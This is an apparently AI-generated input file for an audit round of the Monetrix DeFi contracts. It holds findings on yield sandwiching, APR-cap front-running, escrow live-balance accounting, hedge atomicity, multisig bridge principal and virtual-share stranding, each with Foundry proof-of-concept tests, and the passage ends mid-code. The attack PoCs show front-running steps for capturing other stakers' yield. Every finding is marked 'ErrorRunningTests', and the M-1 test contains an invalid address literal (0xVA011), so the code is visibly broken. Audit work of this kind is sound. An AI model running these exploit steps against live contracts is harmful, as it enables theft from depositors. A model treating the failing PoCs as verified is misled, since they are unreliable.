# 2026-04-monetrix Round Input

Source report: `/Users/apmfree/Desktop/CHAIN SHIELD/ai-agent-audit/2026-04-monetrix/report/audit-report-openai.md`
Finding count: `35`

## Findings

### M-1 / `MQPNhFyzi1LA8-UlwLy-c`
- Finding title: Observable yield injection can be sandwiched by late sUSDM depositors to capture existing stakers' yield
- Report lines: 249-376
```md
## [M-1]. Observable yield injection can be sandwiched by late sUSDM depositors to capture existing stakers' yield

## id: MQPNhFyzi1LA8-UlwLy-c

## Derived From Pattern/Invariant
RewardCheckpointFreeRiderOrLateJoiner

## Exploit Type
FrontrunMev

## Location
sUSDM.deposit

## Finding Status: Valid
### Finding Status Justification: deposit() remains permissionless and prices shares from current totalAssets before an injectYield transaction executes. injectYield then transfers USDM into sUSDM and increases totalAssets for all current shares, with no stake-age check, reward debt, epoch cutoff, or snapshot. A mempool observer with sufficient USDM can deposit before a visible vault injection and cooldown afterward to capture part of yield economically earned before joining. The cooldown delays withdrawal but does not prevent value capture. This matches the V12 late-staker root cause and impact, but the reported severity is Medium rather than V12 High, so it remains in scope under the provided duplicate rule.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
sUSDM accepts new ERC-4626 deposits until the same block in which yield is injected. Because yield is applied as a discrete balance increase in injectYield() and no per-user reward debt, stake-age checkpoint, deposit cutoff, or minimum holding period exists, a mempool observer can deposit immediately before a known vault yield injection and receive a pro-rata share of yield that was economically earned before they joined. Vulnerable flow: deposit(uint256 assets,address receiver) only calls super.deposit while not paused, and injectYield(uint256 usdmAmount) later transfers USDM into the vault and increases totalAssets for all current shares. Snippet: function deposit(uint256 assets,address receiver) public override nonReentrant whenNotPaused returns (uint256) { return super.deposit(assets, receiver); } ... function injectYield(uint256 usdmAmount) external onlyVault nonReentrant { IERC20(asset()).safeTransferFrom(msg.sender, address(this), usdmAmount); totalYieldInjected += usdmAmount; lastCumulativeYield = (totalAssets() * 1e18) / totalSupply(); }

## Impact
A permissionless staker can steal a proportional share of in-flight yield from existing sUSDM holders. The principal remains escrowed during cooldown, but the attacker exits with more USDM than deposited while long-term holders receive less of the injected yield.

## Command to Run Test


## Proof of Concept
1. Alice is the only existing sUSDM holder with 1,000,000 USDM staked. 2. The vault submits an injectYield(100,000 USDM) transaction. 3. An attacker observes it in the mempool and deposits 1,000,000 USDM first. 4. The vault injection executes and the 100,000 USDM yield is split across Alice and the attacker even though the attacker did not contribute during the earning period. 5. The attacker starts cooldown for all shares, waits the configured cooldown, claims from escrow, and receives about 1,050,000 USDM, extracting roughly 50,000 USDM of Alice's yield.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "src/tokens/sUSDM.sol";
import "src/tokens/sUSDMEscrow.sol";
import "src/governance/IMonetrixAccessController.sol";

contract MockUSDM is ERC20 {
    constructor() ERC20("USDM", "USDM") {}
    function decimals() public pure override returns (uint8) { return 6; }
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract MockConfig {
    uint256 public unstakeCooldown = 3 days;
    uint256 public maxYieldPerInjection = type(uint256).max;
}

contract MockACL is IMonetrixAccessController {
    bytes32 public constant override GUARDIAN = keccak256("MONETRIX_GUARDIAN");
    bytes32 public constant override GOVERNOR = keccak256("MONETRIX_GOVERNOR");
    bytes32 public constant override UPGRADER = keccak256("MONETRIX_UPGRADER");
    bytes32 public constant override OPERATOR = keccak256("MONETRIX_OPERATOR");
    mapping(bytes32 => mapping(address => bool)) internal roles;
    function grant(bytes32 role, address account) external { roles[role][account] = true; }
    function hasRole(bytes32 role, address account) public view override returns (bool) { return roles[role][account]; }
    function checkRole(bytes32 role, address account) external view override { require(roles[role][account], "NO_ROLE"); }
}

contract SUSDMYieldSandwichTest is Test {
    MockUSDM usdm;
    MockConfig config;
    MockACL acl;
    sUSDM susdm;
    address governor = address(0xA11CE);
    address vault = address(0xVA011);
    address alice = address(0xA1);
    address attacker = address(0xB0B);

    function setUp() public {
        usdm = new MockUSDM();
        config = new MockConfig();
        acl = new MockACL();
        sUSDM impl = new sUSDM();
        ERC1967Proxy proxy = new ERC1967Proxy(address(impl), abi.encodeCall(sUSDM.initialize, (address(usdm), address(config), address(acl))));
        susdm = sUSDM(address(proxy));
        acl.grant(acl.GOVERNOR(), governor);
        vm.prank(governor);
        susdm.setVault(vault);
        sUSDMEscrow escrow = new sUSDMEscrow(address(usdm), address(susdm));
        vm.prank(governor);
        susdm.setEscrow(address(escrow));
    }

    function testLateDepositorCapturesPendingYield() public {
        uint256 principal = 1_000_000e6;
        uint256 yieldAmount = 100_000e6;
        usdm.mint(alice, principal);
        vm.startPrank(alice);
        usdm.approve(address(susdm), type(uint256).max);
        susdm.deposit(principal, alice);
        vm.stopPrank();

        usdm.mint(attacker, principal);
        vm.startPrank(attacker);
        usdm.approve(address(susdm), type(uint256).max);
        susdm.deposit(principal, attacker);
        vm.stopPrank();

        usdm.mint(vault, yieldAmount);
        vm.startPrank(vault);
        usdm.approve(address(susdm), type(uint256).max);
        susdm.injectYield(yieldAmount);
        vm.stopPrank();

        uint256 attackerShares = susdm.balanceOf(attacker);
        vm.prank(attacker);
        uint256 requestId = susdm.cooldownShares(attackerShares);
        vm.warp(block.timestamp + 3 days + 1);
        vm.prank(attacker);
        susdm.claimUnstake(requestId);

        assertGt(usdm.balanceOf(attacker), principal);
        assertGt(usdm.balanceOf(attacker) - principal, 49_000e6);
    }
}


## Suggested Mitigation
Snapshot eligible shares before yield injection or distribute yield through a per-share index with userRewardPerTokenPaid/rewardDebt so only holders present during the accrual window receive the injection. Alternatively, route yield through epochs with a deposit cutoff, minimum holding period, or pending-deposit queue that becomes active only after the current yield injection is applied.
```

### M-2 / `tRgLb0L5rgUEVRSxwghNr`
- Finding title: Non-atomic hedge batches can leave MonetrixVault with one-sided spot or perp exposure
- Report lines: 377-415
```md
## [M-2]. Non-atomic hedge batches can leave MonetrixVault with one-sided spot or perp exposure

## id: tRgLb0L5rgUEVRSxwghNr

## Derived From Pattern/Invariant
SlippageMissingOrInsufficient / hedge batch should either change both spot and perp legs or neither

## Exploit Type
SlippageMissingOrInsufficient

## Location
MonetrixVault.executeHedge/closeHedge/repairHedge

## Finding Status: Valid
### Finding Status Justification: executeHedge and closeHedge submit two independent HyperCore actions and immediately emit success without reading post-trade spot/perp state or recording a pending batch. The only precheck is the whitelist pair check, which does not prove either leg filled. Given the documented CoreWriter/L1 semantics where submitted actions can be dropped, rest, or partially fill, a valid operator batch can leave directional exposure until detected and repaired. This threatens backing through market movement, but requires venue conditions and operator execution, so likelihood is occasional.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresRole


## Description
MonetrixVault dispatches hedge legs as independent HyperCore actions and immediately treats the batch as successful without checking whether both legs were accepted, filled, or left the portfolio delta-neutral. Vulnerable snippet: `ActionEncoder.sendBuySpot(params); ActionEncoder.sendShortPerp(params); emit HedgeExecuted(...)` and similarly `sendSellSpot` followed by `sendClosePerp` in `closeHedge`. Because CoreWriter actions can be accepted by the EVM call while an order rests, partially fills, or is dropped by L1 semantics, the vault can record a completed hedge while only one side economically changed.

## Impact
A valid operator hedge can leave protocol backing exposed to spot or perp price movement. If the unmatched leg moves adversely before repair, USDM backing can suffer real losses and later settlement/accounting can be based on a portfolio state that is not delta-neutral.

## Command to Run Test


## Proof of Concept
1. Operator submits an opening hedge with maker-style or otherwise non-guaranteed fills. 2. The spot buy is accepted/filled, but the perp short is not filled or is dropped by HyperCore. 3. `executeHedge` emits `HedgeExecuted` and stores no pending failure state. 4. External traders move the spot asset down before repair. 5. The vault holds unhedged long exposure and loses backing value.

## Proof of Code
Foundry PoC shape: deploy MonetrixVault behind ERC1967Proxy with a MockACL granting OPERATOR to `operator`, a MockConfig returning `isPerpWhitelisted=true` and `perpToSpotPairAssetId=10001`, and `vm.etch` a MockCoreWriter at `0x3333333333333333333333333333333333333333`. The mock increments `calls` but intentionally marks `secondLegApplied=false` on the second `sendRawAction`. Test: `vm.prank(operator); vault.executeHedge(1, ActionEncoder.HedgeParams({spotAsset:10001, perpAsset:1, size:1e8, spotPrice:1000e8, perpPrice:1000e8, cloid:0, tif:1, spotReduceOnly:false, perpReduceOnly:false})); assertEq(MockCoreWriter(CORE).calls(), 2); assertFalse(MockCoreWriter(CORE).secondLegApplied());` The call succeeds even though the paired leg was not economically applied.

## Suggested Mitigation
Do not emit or treat a hedge as complete until post-action L1 reads confirm both legs changed by the intended matched notional within a configured tolerance. Use IOC/min-fill constraints where possible, record pending hedge batches, block settlement while a batch is unmatched, and require explicit repair/finalization before the position is considered healthy.
```

### M-3 / `zhpa5luow_LNZA3sBdQxN`
- Finding title: Unsolicited USDC can become distributable yield through YieldEscrow live-balance accounting
- Report lines: 416-525
```md
## [M-3]. Unsolicited USDC can become distributable yield through YieldEscrow live-balance accounting

## id: zhpa5luow_LNZA3sBdQxN

## Derived From Pattern/Invariant
AccountingInvariantViolation: distributable yield must be bound to Accountant-approved settlement rather than mutable live token balance

## Exploit Type
AccountingInvariantViolation

## Location
YieldEscrow.balance / pullForDistribution

## Finding Status: Valid
### Finding Status Justification: The reported code path exists. YieldEscrow.balance() returns the raw USDC balance and pullForDistribution() only checks msg.sender == vault, amount > 0, and usdc.balanceOf(address(this)) >= amount before transferring funds to the Vault. There is no internal settled-yield ledger, settlement epoch, Accountant approval reference, or Vault-originated credit accounting. Because ordinary ERC20 transfers to YieldEscrow cannot be rejected, any account can increase the escrow's raw USDC balance without passing through the Accountant settlement gates. If the Vault distribution flow uses YieldEscrow.balance() or the escrow live balance as distributable yield, the unsolicited or stale balance is indistinguishable from approved yield and can be pulled into downstream distribution. The finding is not mitigated by onlyVault, because onlyVault protects who pulls funds out, not what amount is recognized as settled yield. It is not by design: the documented architecture says yield is first recognized by the Accountant and then escrowed for later distribution, so the real invariant is that distribution should be bounded by Accountant-approved yield. The issue is in scope despite similarity to the V12 live-balance accounting item because the submitted severity is Medium while the listed V12 item is High, and the contest duplicate rule excludes only same root cause, same impact, and same severity. Exploitability is realistic for the unsolicited-balance path, although economic profit depends on timing and downstream Vault behavior, so likelihood is Occasional rather than Common. Impact is Medium: the bug can corrupt yield accounting and distribute stale/unapproved funds, but unsolicited donations alone do not steal assets from other users. It does not require user error, privileged-role misuse, future integrations, or non-standard token behavior.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
YieldEscrow has no internal settled-yield ledger, settlement id, timestamp, or Vault-originated deposit accounting. Its public balance helper and withdrawal path use the raw USDC balance held by the contract, so any ERC20 transfer to the escrow address is later indistinguishable from yield approved by the Accountant pipeline.

Vulnerable snippet:
function pullForDistribution(uint256 amount) external onlyVault {
    require(amount > 0, "YieldEscrow: zero amount");
    require(usdc.balanceOf(address(this)) >= amount, "YieldEscrow: insufficient balance");
    usdc.safeTransfer(vault, amount);
    emit DistributionPulled(amount);
}

function balance() external view returns (uint256) {
    return usdc.balanceOf(address(this));
}

Because ERC20 transfers cannot be rejected, a permissionless account can increase usdc.balanceOf(YieldEscrow) without any corresponding Accountant-approved settlement. If the Vault distribution flow treats YieldEscrow.balance() or the escrow's live USDC balance as distributable yield, the Accountant's settlement gates are bypassed for that amount. The same missing binding also allows stale escrowed funds from a previous surplus window to be pulled after later losses, because pullForDistribution checks only caller, amount, and current token balance.

## Impact
Unaccounted or stale USDC can be routed through the yield distribution pipeline as if it were current Accountant-approved yield. This can inflate sUSDM yield distribution, route funds to insurance/foundation splits outside the settlement model, and reduce USDM backing when old escrow balances are distributed after protocol surplus has disappeared.

## Command to Run Test


## Proof of Concept
1. YieldEscrow is initialized with USDC and the Vault address.
2. A non-vault address transfers USDC directly to address(YieldEscrow); this is permissionless ERC20 behavior and does not call any settlement function.
3. YieldEscrow.balance() increases even though no Accountant-approved yield was settled.
4. The Vault later calls pullForDistribution for the increased balance.
5. The escrow transfers the unsolicited amount to the Vault because it validates only the live token balance, making the amount available to downstream yield distribution as if it were legitimate settled yield.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {YieldEscrow} from "../src/core/YieldEscrow.sol";

contract MockUSDC is ERC20 {
    constructor() ERC20("USD Coin", "USDC") {}
    function decimals() public pure override returns (uint8) { return 6; }
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract MockACL {
    bytes32 public constant GUARDIAN = keccak256("MONETRIX_GUARDIAN");
    bytes32 public constant GOVERNOR = keccak256("MONETRIX_GOVERNOR");
    bytes32 public constant UPGRADER = keccak256("MONETRIX_UPGRADER");
    bytes32 public constant OPERATOR = keccak256("MONETRIX_OPERATOR");
    function hasRole(bytes32, address) external pure returns (bool) { return true; }
    function checkRole(bytes32, address) external pure {}
}

contract YieldEscrowLiveBalancePoC is Test {
    function testUnsolicitedUsdcBecomesPullableDistributionBalance() external {
        address vault = address(0xBEEF);
        address attacker = address(0xA11CE);

        MockUSDC usdc = new MockUSDC();
        MockACL acl = new MockACL();
        YieldEscrow implementation = new YieldEscrow();
        ERC1967Proxy proxy = new ERC1967Proxy(
            address(implementation),
            abi.encodeCall(YieldEscrow.initialize, (address(usdc), vault, address(acl)))
        );
        YieldEscrow escrow = YieldEscrow(address(proxy));

        usdc.mint(attacker, 100e6);
        assertEq(escrow.balance(), 0);

        vm.prank(attacker);
        usdc.transfer(address(escrow), 100e6);

        assertEq(escrow.balance(), 100e6);
        assertEq(usdc.balanceOf(address(escrow)), 100e6);

        uint256 vaultBefore = usdc.balanceOf(vault);
        vm.prank(vault);
        escrow.pullForDistribution(100e6);

        assertEq(usdc.balanceOf(vault), vaultBefore + 100e6);
        assertEq(escrow.balance(), 0);
    }
}

## Suggested Mitigation
Track Accountant-approved settled yield internally instead of using the raw token balance as the distributable amount. Add a Vault-only credit function that increments settledYield when settlement transfers USDC in, decrement settledYield before or during pullForDistribution, and require amount <= settledYield. Include settlement epoch/timestamp invalidation or have the Vault/Accountant revalidate current surplus before distribution. Keep balance() as an informational raw-balance view or expose separate rawBalance() and distributableBalance() values.
```

### H-4 / `i9H5Zq0-WT7HizyybWMol`
- Finding title: Live supply APR cap lets late stakers front-run settlement and capture yield accrued before they joined
- Report lines: 526-594
```md
## [H-4]. Live supply APR cap lets late stakers front-run settlement and capture yield accrued before they joined

## id: i9H5Zq0-WT7HizyybWMol

## Derived From Pattern/Invariant
FrontrunMev / AccountingInvariantViolation: live supply and live share base used for previously accrued yield

## Exploit Type
FrontrunMev

## Location
MonetrixVault.settle/distributeYield

## Finding Status: Valid
### Finding Status Justification: settleDailyPnL computes the APR cap from the live USDM totalSupply, and distributeYield injects into the live sUSDM share base. A large pre-settlement depositor can increase supply without increasing previously accrued surplus, then stake before distribution and receive most of the userShare. Existing gates cap total yield but do not snapshot eligible supply or staking balances. This is distinct from simple pending-yield sniping because the attacker also expands the settlement cap that determines how much old surplus becomes distributable.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The settlement cap and distribution base are both live reads. `MonetrixVault.settle()` forwards `proposedYield` to the accountant, whose annualized cap is based on the current `usdm.totalSupply()`: `uint256 cap = (usdm.totalSupply() * IMonetrixConfigReader(config).maxAnnualYieldBps() * elapsed) / (10_000 * 365 days); require(proposedYield <= cap, "Accountant: exceeds annualized cap");`. Later, `distributeYield()` injects the user share into the current `sUSDM` supply: `uint256 userShare = (totalYield * config.userYieldBps()) / 10000; ... if (userShare > 0) { usdm.mint(address(this), userShare); IERC20(address(usdm)).forceApprove(address(susdm), userShare); susdm.injectYield(userShare); }`. A large depositor can enter immediately before the daily settle, increasing the live USDM supply used by Gate 4 without contributing to the already-accrued surplus. The same attacker then stakes the freshly minted USDM before distribution, so the enlarged settlement is injected into a share base dominated by the late entrant. This is a pre-settlement variant of yield sniping: the attacker does not only wait for funds already in `YieldEscrow`; they can also expand the on-chain APR cap that decides how much old surplus becomes distributable in the first place.

## Impact
Existing sUSDM holders lose matured yield to a late entrant. With enough temporary USDC, the attacker can make an otherwise cap-limited settlement distribute most of the accrued period yield to themselves, then exit through the normal unstake/redeem cooldowns.

## Command to Run Test
forge test --match-contract LiveSupplyCapSnipingTest

## Proof of Concept
1. Existing users have 1,000 USDM staked in sUSDM. 2. The strategy has already accrued 100 USDC of surplus, but with 1,000 USDM supply and a 12% APR cap, only about 0.328 USDM can be settled after one day. 3. The attacker deposits 1,000,000 USDC into `MonetrixVault.deposit()` just before the keeper settles, receiving 1,000,000 USDM. 4. The attacker stakes that USDM into sUSDM before `distributeYield()`. 5. The live supply is now 1,001,000 USDM, so the one-day annualized cap is about 329 USDM and the full 100 USDM surplus can be settled. 6. `distributeYield()` injects the 70 USDM user share into the current sUSDM base; the attacker owns about 99.9% of shares and captures almost all of that yield accrued before they joined.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;
import "forge-std/Test.sol";

contract LiveSupplyCapSnipingTest is Test {
    uint256 constant BPS = 10_000;
    uint256 constant YEAR = 365 days;

    function cap(uint256 supply, uint256 annualBps, uint256 elapsed) internal pure returns (uint256) {
        return supply * annualBps * elapsed / (BPS * YEAR);
    }

    function testLateDepositExpandsSettlementCapAndCapturesOldYield() public pure {
        uint256 oldSupply = 1_000e6;
        uint256 oldStakedShares = 1_000e6;
        uint256 attackerDeposit = 1_000_000e6;
        uint256 oldAccruedSurplus = 100e6;

        uint256 capBefore = cap(oldSupply, 1200, 1 days);
        assertLt(capBefore, oldAccruedSurplus);

        uint256 capAfter = cap(oldSupply + attackerDeposit, 1200, 1 days);
        assertGt(capAfter, oldAccruedSurplus);

        uint256 settledBecauseOfFrontRun = oldAccruedSurplus;
        uint256 userShare = settledBecauseOfFrontRun * 7000 / BPS;
        uint256 attackerYield = userShare * attackerDeposit / (oldStakedShares + attackerDeposit);

        assertGt(attackerYield, 69e6);
    }
}

## Suggested Mitigation
Snapshot the supply eligible for the APR cap at the beginning of each settlement interval, or track time-weighted eligible supply. Separately, distribute yield against an sUSDM share snapshot taken before the yield accrual/settlement period, or impose a yield eligibility delay so stake added after the accrual window cannot receive that window's distribution.
```

### M-5 / `vzb5HZneiQ6_eF3s_2gUG`
- Finding title: Multisig keeperBridge records principal that Vault cannot bridge back for redemptions
- Report lines: 595-633
```md
## [M-5]. Multisig keeperBridge records principal that Vault cannot bridge back for redemptions

## id: vzb5HZneiQ6_eF3s_2gUG

## Derived From Pattern/Invariant
AccountingInvariantViolation: outstandingL1Principal must represent returnable principal

## Exploit Type
AccountingInvariantViolation

## Location
MonetrixVault.keeperBridge / bridgePrincipalFromL1

## Finding Status: Valid
### Finding Status Justification: keeperBridge can choose multisigVault as recipient but always increments the global outstandingL1Principal. bridgePrincipalFromL1 later calls _sendL1Bridge, which reads and sends only from address(this) on L1. Principal credited to the multisig L1 account is therefore counted in the vault's returnable principal but cannot be returned by the normal vault bridge-back path. This can block redemption funding until the multisig or governance performs out-of-band recovery. The path is role-gated but is a valid configured flow, not merely an arbitrary external call.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresRole


## Description
`keeperBridge()` can deposit EVM USDC to either the Vault L1 account or `multisigVault`, but it increments the single global `outstandingL1Principal` for both targets. Vulnerable snippet: `recipient = target == BridgeTarget.Multisig ... ? multisigVault : address(this); outstandingL1Principal += amount; ... depositFor(recipient, amount, ...)`. The return path does not know which L1 account received the principal. `bridgePrincipalFromL1()` only calls `_sendL1Bridge(amount)`, and `_sendL1Bridge()` checks and sends from `address(this)` by reading `PrecompileReader.spotBalance(address(this), usdcToken)` and optionally `suppliedBalance(address(this), usdcToken)`. Principal credited to `multisigVault` can therefore inflate `outstandingL1Principal` while being unavailable to the Vault-side bridge-back path.

## Impact
During redemption shortfall, the protocol can appear to have enough `outstandingL1Principal` while `bridgePrincipalFromL1()` reverts because the Vault L1 account lacks the funds. This can delay or block redemption funding until off-chain multisig action or governance intervention returns the principal.

## Command to Run Test


## Proof of Concept
1. Governance enables `multisigVaultEnabled` and sets a nonzero multisig vault. 2. Operator calls `keeperBridge(BridgeTarget.Multisig)`. 3. The deposit credits the multisig L1 account, but `outstandingL1Principal` increases globally. 4. Users create redemption shortfall. 5. Operator calls `bridgePrincipalFromL1(amount)`. 6. The call passes the global outstanding-principal check but `_sendL1Bridge()` reads only the Vault's own L1 USDC balance and reverts because the principal sits under the multisig account.

## Proof of Code
function testMultisigBridgePrincipalCannotReturnThroughVaultPath() public { uint256 amount = 1000e6; deal(address(usdc), address(vault), amount); vm.prank(governor); vault.setMultisigVault(multisig); vm.prank(governor); vault.setMultisigVaultEnabled(true); vm.warp(block.timestamp + config.bridgeInterval()); vm.prank(operator); vault.keeperBridge(MonetrixVault.BridgeTarget.Multisig); assertEq(vault.outstandingL1Principal(), amount); makeRedeemShortfall(100e6); bytes memory emptySpot = abi.encode(uint64(0), uint64(0), uint64(0)); vm.mockCall(HyperCoreConstants.PRECOMPILE_SPOT_BALANCE, abi.encode(address(vault), uint64(HyperCoreConstants.USDC_TOKEN_INDEX)), emptySpot); vm.prank(operator); vm.expectRevert(); vault.bridgePrincipalFromL1(100e6); }

## Suggested Mitigation
Track outstanding L1 principal per recipient account. Only allow `bridgePrincipalFromL1()` to decrement and return principal from the same L1 account that received it, or disallow `BridgeTarget.Multisig` for principal that must be serviced by the Vault's bridge-back path. If multisig bridging remains supported, add an explicit multisig return workflow and exclude multisig balances from Vault-returnable principal.
```

### M-6 / `0whGLNpUqbf2aQHrfzF4U`
- Finding title: Multisig bridge target inflates Vault principal that the Vault cannot bridge back
- Report lines: 634-721
```md
## [M-6]. Multisig bridge target inflates Vault principal that the Vault cannot bridge back

## id: 0whGLNpUqbf2aQHrfzF4U

## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
AccountingInvariantViolation

## Location
MonetrixVault.keeperBridge

## Finding Status: Valid
### Finding Status Justification: keeperBridge can deposit to multisigVault when enabled, but it still increments the vault's single outstandingL1Principal counter. The bridge-back path only reads and sends from the vault contract's own L1 account. Therefore principal under the multisig account can make the vault accounting look recoverable while bridgePrincipalFromL1 reverts or cannot source funds. This is not the same as the V12 arbitrary multisig-backing issue because the impact here is returnability of principal for redemptions.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresRole


## Description
`keeperBridge(BridgeTarget.Multisig)` increments `outstandingL1Principal` for funds credited to `multisigVault`, but `bridgePrincipalFromL1()` can only bridge funds from the vault contract's own L1 account because `_sendL1Bridge()` reads `PrecompileReader.spotBalance(address(this), usdcToken)`. This makes `outstandingL1Principal` represent principal not actually available to the vault-side bridge-back path. Vulnerable snippet: `recipient = target == Multisig ? multisigVault : address(this); outstandingL1Principal += amount; ... depositFor(recipient, amount, ...)`, while `_sendL1Bridge` checks only `spotBalance(address(this), usdcToken)`.

## Impact
During redemption pressure, the vault can report outstanding principal sufficient for bridge-back while the actual L1 funds are held under the multisig account, causing `bridgePrincipalFromL1` to revert and delaying or blocking redemption funding until out-of-band multisig action occurs.

## Command to Run Test


## Proof of Concept
1. Multisig bridging is enabled and `multisigVault` is set.
2. Operator calls `keeperBridge(BridgeTarget.Multisig)`.
3. The full EVM USDC amount is deposited to the multisig L1 account, but `outstandingL1Principal` is incremented on the vault.
4. Later redemptions create a shortfall and operator calls `bridgePrincipalFromL1(amount)`.
5. `_sendL1Bridge` checks the vault L1 account, not the multisig account, and reverts despite `outstandingL1Principal >= amount`.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import "forge-std/Test.sol";

contract MockCoreDepositWallet {
    mapping(address => uint256) public l1Balance;
    function depositFor(address recipient, uint256 amount, uint32) external { l1Balance[recipient] += amount; }
}

contract MultisigBridgeHarness {
    enum BridgeTarget { Vault, Multisig }
    MockCoreDepositWallet public core;
    address public multisigVault;
    bool public multisigVaultEnabled;
    uint256 public outstandingL1Principal;
    constructor(MockCoreDepositWallet _core, address _multisig) { core = _core; multisigVault = _multisig; }
    function setMultisigVaultEnabled(bool enabled) external { multisigVaultEnabled = enabled; }
    function keeperBridge(BridgeTarget target, uint256 amount) external {
        address recipient = (target == BridgeTarget.Multisig && multisigVaultEnabled && multisigVault != address(0)) ? multisigVault : address(this);
        outstandingL1Principal += amount;
        core.depositFor(recipient, amount, type(uint32).max);
    }
    function bridgePrincipalFromL1(uint256 amount) external {
        require(amount <= outstandingL1Principal, "invalid bridge amount");
        require(core.l1Balance(address(this)) >= amount, "L1 USDC insufficient");
        outstandingL1Principal -= amount;
    }
}

contract MultisigBridgeAccountingPoC is Test {
    function testMultisigBridgePrincipalNotBridgeableByVault() external {
        MockCoreDepositWallet core = new MockCoreDepositWallet();
        address multisig = address(0xBEEF);
        MultisigBridgeHarness vault = new MultisigBridgeHarness(core, multisig);
        vault.setMultisigVaultEnabled(true);

        vault.keeperBridge(MultisigBridgeHarness.BridgeTarget.Multisig, 1_000e6);
        assertEq(vault.outstandingL1Principal(), 1_000e6);
        assertEq(core.l1Balance(multisig), 1_000e6);
        assertEq(core.l1Balance(address(vault)), 0);

        vm.expectRevert(bytes("L1 USDC insufficient"));
        vault.bridgePrincipalFromL1(1_000e6);
    }
}

## Suggested Mitigation
Track principal by L1 owner/account or do not add multisig-targeted deposits to `outstandingL1Principal` used by the vault bridge-back path. Alternatively add a separate multisig-return flow and exclude multisig principal from `bridgePrincipalFromL1` availability assumptions.
```

### M-7 / `p_4jfP5ct6TDbca9VeaQR`
- Finding title: Virtual share scaling in sUSDM._decimalsOffset can trap material injected yield after dust initialization
- Report lines: 722-834
```md
## [M-7]. Virtual share scaling in sUSDM._decimalsOffset can trap material injected yield after dust initialization

## id: p_4jfP5ct6TDbca9VeaQR

## Derived From Pattern/Invariant
ERC4626SharePriceMismatch

## Exploit Type
ERC4626SharePrice

## Location
sUSDM._decimalsOffset

## Finding Status: Valid
### Finding Status Justification: The finding accurately identifies the root cause in _decimalsOffset() and decimals(). OZ ERC4626 uses 10**6 virtual shares, while the share token still reports 6 decimals. A dust first deposit can mint real shares equal to the virtual-share constant, and injectYield can later add large assets because totalSupply() is nonzero. On cooldown, convertToAssets(totalSupply()) returns only the real-share fraction, so the remaining USDM stays in sUSDM without an unstake request after totalSupply reaches zero. There is no code-level safeguard such as minimum initial liquidity or real-supply threshold. The V12 duplicate has Low severity, whereas this finding is Medium, so it is in scope.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
sUSDM reports 6 share decimals but also returns a 6-decimal ERC4626 virtual share offset. OpenZeppelin ERC4626 uses 10 ** _decimalsOffset() as virtual shares in conversions, so a 1 raw-unit USDM dust deposit mints 1e6 raw sUSDM shares, exactly matching the 1e6 virtual-share constant. Later yield injected through injectYield is partially attributed to those virtual shares rather than real holders. If the real holder cools down all shares, only the real-share portion is moved to escrow and the remaining USDM stays in sUSDM with totalSupply() == 0 and no unstake request. Vulnerable snippet: function _decimalsOffset() internal pure override returns (uint8) { return 6; } function decimals() public pure override returns (uint8) { return 6; }

## Impact
A permissionless dust initializer can make a later legitimate yield injection lose a material fraction of distributed USDM to virtual shares. With 1 raw USDM unit of real supply, about half of any injected yield remains stranded or misallocated instead of becoming claimable by sUSDM holders.

## Command to Run Test


## Proof of Concept
1. Attacker deposits 1 smallest USDM unit into an empty sUSDM vault. 2. Because _decimalsOffset() is 6, the attacker receives 1e6 raw sUSDM shares while 1e6 virtual shares also exist in the ERC4626 conversion denominator. 3. The bound vault injects yield because totalSupply() > 0. 4. The attacker cools down all real shares. 5. convertToAssets(totalSupply()) returns only about half of totalAssets(), so cooldownShares moves only that half to escrow. 6. totalSupply() becomes zero while the other half of the USDM remains in sUSDM without a claimant.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {sUSDM} from "../src/tokens/sUSDM.sol";
import {sUSDMEscrow} from "../src/tokens/sUSDMEscrow.sol";

contract MockUSDM is ERC20 {
    constructor() ERC20("Mock USDM", "USDM") {}
    function decimals() public pure override returns (uint8) { return 6; }
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract MockConfig {
    function unstakeCooldown() external pure returns (uint256) { return 3 days; }
    function maxYieldPerInjection() external pure returns (uint256) { return type(uint256).max; }
}

contract MockACL {
    bytes32 public constant GUARDIAN = keccak256("MONETRIX_GUARDIAN");
    bytes32 public constant GOVERNOR = keccak256("MONETRIX_GOVERNOR");
    bytes32 public constant UPGRADER = keccak256("MONETRIX_UPGRADER");
    bytes32 public constant OPERATOR = keccak256("MONETRIX_OPERATOR");
    function hasRole(bytes32, address) external pure returns (bool) { return true; }
    function checkRole(bytes32, address) external pure {}
}

contract SUSDMVirtualShareLossPoC is Test {
    MockUSDM usdm;
    sUSDM susdm;
    sUSDMEscrow escrow;

    function setUp() public {
        usdm = new MockUSDM();
        MockConfig config = new MockConfig();
        MockACL acl = new MockACL();
        sUSDM impl = new sUSDM();
        ERC1967Proxy proxy = new ERC1967Proxy(
            address(impl),
            abi.encodeCall(sUSDM.initialize, (address(usdm), address(config), address(acl)))
        );
        susdm = sUSDM(address(proxy));
